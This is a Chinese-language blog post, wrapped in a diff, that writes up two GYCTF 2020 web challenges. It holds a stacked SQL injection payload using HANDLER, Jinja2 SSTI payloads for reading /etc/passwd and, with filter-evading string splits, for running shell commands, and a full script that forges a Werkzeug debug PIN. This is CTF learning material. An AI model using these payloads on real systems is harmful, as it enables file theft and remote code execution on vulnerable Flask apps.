@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/HeadPortrait-32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/HeadPortrait-16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://www.xianfish.xyz').hostname,
+    root: '/',
+    scheme: 'Muse',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="挺早以前的比赛了，第一天的web当时全部做完了，都是基础，没有记录，中途还看了V&amp;amp;N的招新赛和xctf的抗疫公益赛，见证了神仙打架和队友带飞，垃圾的我web表示根本没有签到，这两个也都没有去复现，也没时间(懒)，最近安排也有变化，准备了解一下嵌入式，嵌入式逆向了，所以开始学习汇编，再加上网课使人头疼，鸽了好多好多东西，这里只有ichunqiu那个GYCTF的两个web的复现，第一题当时以为">
+<meta name="keywords" content="CTFWEB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GYCTF新春战疫">
+<meta property="og:url" content="http://www.xianfish.xyz/2020/03/16/GYCTF新春战疫/index.html">
+<meta property="og:site_name" content="Hi~">
+<meta property="og:description" content="挺早以前的比赛了，第一天的web当时全部做完了，都是基础，没有记录，中途还看了V&amp;amp;N的招新赛和xctf的抗疫公益赛，见证了神仙打架和队友带飞，垃圾的我web表示根本没有签到，这两个也都没有去复现，也没时间(懒)，最近安排也有变化，准备了解一下嵌入式，嵌入式逆向了，所以开始学习汇编，再加上网课使人头疼，鸽了好多好多东西，这里只有ichunqiu那个GYCTF的两个web的复现，第一题当时以为">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/03/16/GYCTF新春战疫/0.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/03/16/GYCTF新春战疫/1.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/03/16/GYCTF新春战疫/2.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/03/16/GYCTF新春战疫/3.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/03/16/GYCTF新春战疫/4.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/03/16/GYCTF新春战疫/5.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/03/16/GYCTF新春战疫/6.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/03/16/GYCTF新春战疫/emmm.jpg">
+<meta property="og:updated_time" content="2020-03-16T07:00:47.321Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="GYCTF新春战疫">
+<meta name="twitter:description" content="挺早以前的比赛了，第一天的web当时全部做完了，都是基础，没有记录，中途还看了V&amp;amp;N的招新赛和xctf的抗疫公益赛，见证了神仙打架和队友带飞，垃圾的我web表示根本没有签到，这两个也都没有去复现，也没时间(懒)，最近安排也有变化，准备了解一下嵌入式，嵌入式逆向了，所以开始学习汇编，再加上网课使人头疼，鸽了好多好多东西，这里只有ichunqiu那个GYCTF的两个web的复现，第一题当时以为">
+<meta name="twitter:image" content="http://www.xianfish.xyz/2020/03/16/GYCTF新春战疫/0.png">
+
+<link rel="canonical" href="http://www.xianfish.xyz/2020/03/16/GYCTF新春战疫/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>GYCTF新春战疫 | Hi~</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hi~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">人生总有各种理由将一个人变成一个five!</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://www.xianfish.xyz/2020/03/16/GYCTF新春战疫/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/HeadPortrait.png">
+      <meta itemprop="name" content="瑟瑟发抖咸鱼黄">
+      <meta itemprop="description" content="您看！工具人啥都不配拥有!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hi~">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          GYCTF新春战疫
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-03-16 14:34:03 / Modified: 15:00:47" itemprop="dateCreated datePublished" datetime="2020-03-16T14:34:03+08:00">2020-03-16</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>挺早以前的比赛了，第一天的web当时全部做完了，都是基础，没有记录，中途还看了V&amp;N的招新赛和xctf的抗疫公益赛，见证了神仙打架和队友带飞，垃圾的我web表示根本没有签到，这两个也都没有去复现，也没时间(懒)，最近安排也有变化，准备了解一下嵌入式，嵌入式逆向了，所以开始学习汇编，再加上网课使人头疼，鸽了好多好多东西，这里只有ichunqiu那个GYCTF的两个web的复现，第一题当时以为很难，没去看，结果复现发现，自己做过类似的，即使是改动的地方，以前也看过，第二题也很简单，菜鸡如我也一个多小时就出来了</p>
+<a id="more"></a>
+<h1 id="0x01-Blacklist"><a href="#0x01-Blacklist" class="headerlink" title="0x01 Blacklist"></a>0x01 Blacklist</h1><p>这道题和去强网杯那道题有点像emmmm，堆叠注入，过滤了一些字符</p>
+<p><img src="/2020/03/16/GYCTF新春战疫/0.png" alt="0"></p>
+<p>但是这里过滤了set，就没办法实用存储过程了，但是我们这里还可以使用handler进行数据读取，这条语句使我们能够一行一行的浏览一个表中的数据</p>
+<p>Payload : <code>inject=1&#39;;handler FlagHere open as xianyu;handler xianyu read first;</code></p>
+<p><img src="/2020/03/16/GYCTF新春战疫/1.png" alt="1"></p>
+<h1 id="0x02-FlaskApp"><a href="#0x02-FlaskApp" class="headerlink" title="0x02 FlaskApp"></a>0x02 FlaskApp</h1><p>题目是一个关于base64加密解密的页面，根据题目很容易就知道这是个ssti，事实也确实如此，在解密处就可以触发，将构造好的poc经过base64加密后在解密处解密就可以触发</p>
+<p><code> ==&gt; e3tjb25maWd9fQ==</code></p>
+<p><img src="/2020/03/16/GYCTF新春战疫/2.png" alt="2"></p>
+<p>接下来就是想办法去执行命令或者读取文件，但是这里过滤了很多东西，命令执行没有成功，但是还是可以读取文件的，</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__ [&apos;__builtins__&apos;].open(&apos;/etc/passwd&apos;,&apos;r&apos;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p>我做到这里的时候，没有flag的路径也没办法读到flag，所以开始找其他线索，发现在error界面(解密时随便输入一些字符就可以进入)有一个这个东西，很巧的是，前段时间刚好看过一点这东西</p>
+<p><img src="/2020/03/16/GYCTF新春战疫/3.png" alt="3"></p>
+<p>这个东西是flask开启debug模式的时候，在服务端会给一个pin，我们在浏览器输入(上图)这个pin就可以进入python的命令交互界面，这里的pin的生成机制存在安全问题，通过一些固定参数就可以算出来，配合任意文件读取就可以</p>
+<p>参考链接：<a href="https://xz.aliyun.com/t/2553#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2553#toc-2</a></p>
+<p>这里我们需要获取的参数为：</p>
+<p><img src="/2020/03/16/GYCTF新春战疫/4.png" alt="4"></p>
+<ul>
+<li>运行程序的用户名，通过passwd文件可以知道是flaskweb</li>
+<li>modname 默认为flask.app</li>
+<li>getattr(app, ‘<strong>name</strong>‘, getattr(app.<strong>class</strong>, ‘<strong>name</strong>‘)) 默认为Flask</li>
+<li>app.py 的绝对路径，在error界面可以直接找到</li>
+</ul>
+<p><img src="/2020/03/16/GYCTF新春战疫/5.png" alt="5"></p>
+<ul>
+<li>mac地址 这里直接读取/sys/class/net/eth0/address，然后转为十进制就行</li>
+<li>get_machine_id 读取/etc/machine-id可以得到</li>
+</ul>
+<p>然后实用脚本算出pin</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'flaskweb'</span>,<span class="comment"># username flaskweb</span></span><br><span class="line">    <span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>,<span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'2485410390932'</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">'1408f836b0ca514d796cbf8960e45fa1'</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="keyword">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="keyword">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
+<p>然而我计算出的pin值输入后，还是提示错误，不清楚哪一步了出了问题emmmm，赛后看了WP方法也和我的一样，但是还是pin错误，但是我最后也出了flag，emmmm，接下来就说一下我后面的方法吧</p>
+<p>其实这里还可以想办法绕过过滤直接实现命令执行233333</p>
+<p>Payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__ [&apos;__builtins__&apos;][&apos;ev&apos;+&apos;al&apos;](&apos;__im&apos;+&apos;port__(&quot;o&quot;+&quot;s&quot;).po&apos;+&apos;pen(&quot;cat ../this_is_the_fl&quot;+&quot;ag.txt&quot;).read()&apos;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/16/GYCTF新春战疫/6.png" alt="1"></p>
+<p><img src="/2020/03/16/GYCTF新春战疫/emmm.jpg" alt="emmm"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTFWEB/" rel="tag"># CTFWEB</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/14/DES简单学习/" rel="prev" title="DES简单学习">
+      <i class="fa fa-chevron-left"></i> DES简单学习
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-Blacklist"><span class="nav-number">1.</span> <span class="nav-text">0x01 Blacklist</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-FlaskApp"><span class="nav-number">2.</span> <span class="nav-text">0x02 FlaskApp</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="瑟瑟发抖咸鱼黄"
+      src="/images/HeadPortrait.png">
+  <p class="site-author-name" itemprop="name">瑟瑟发抖咸鱼黄</p>
+  <div class="site-description" itemprop="description">您看！工具人啥都不配拥有!</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">40</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://gorgias.me/" title="https://gorgias.me/" rel="noopener" target="_blank">巨佬</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://couplee.wang/" title="http://couplee.wang/" rel="noopener" target="_blank">wnagzihxa1n</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/warrenryan" title="https://www.cnblogs.com/warrenryan" rel="noopener" target="_blank">WarrenRyan</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://rinbn.com/" title="http://rinbn.com/" rel="noopener" target="_blank">Rinbn</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.imzj.top/" title="https://www.imzj.top/" rel="noopener" target="_blank">imzj</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://pukrr.github.io/" title="https://pukrr.github.io/" rel="noopener" target="_blank">pukrr</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://q0o0p.top" title="http://q0o0p.top" rel="noopener" target="_blank">q0o0p</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.immity.best" title="http://blog.immity.best" rel="noopener" target="_blank">陈组长大人</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/wushengyang" title="https://www.cnblogs.com/wushengyang" rel="noopener" target="_blank">PY</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=40915694&auto=0&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">瑟瑟发抖咸鱼黄</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://muse.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.0
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":200,"height":400},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
